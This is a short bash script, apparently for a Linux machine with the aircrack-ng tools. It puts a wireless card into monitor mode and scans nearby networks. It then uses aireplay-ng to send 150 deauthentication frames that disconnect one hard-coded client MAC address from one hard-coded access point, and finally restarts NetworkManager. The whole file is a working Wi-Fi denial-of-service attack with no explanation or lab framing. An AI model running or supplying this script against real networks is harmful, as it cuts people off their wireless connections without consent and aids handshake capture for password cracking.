#!/bin/bash

airmon-ng check kill > /dev/null 2>&1
airmon-ng start wlan0 > /dev/null 2>&1
airodump-ng wlan0mon > /dev/null 2>&1 &
var=$! ; sleep 15 ; kill -9 $var
airodump-ng -c 1 --bssid 00:23:04:B7:EF:D0 wlan0mon > /dev/null 2>&1 &
var=$! ; sleep 15 ; kill -9 $var
aireplay-ng -0 150 -a 00:23:04:B7:EF:D0 -c B8:27:EB:F0:37:FB wlan0mon
airmon-ng stop wlan0mon
systemctl enable NetworkManager
systemctl start NetworkManager

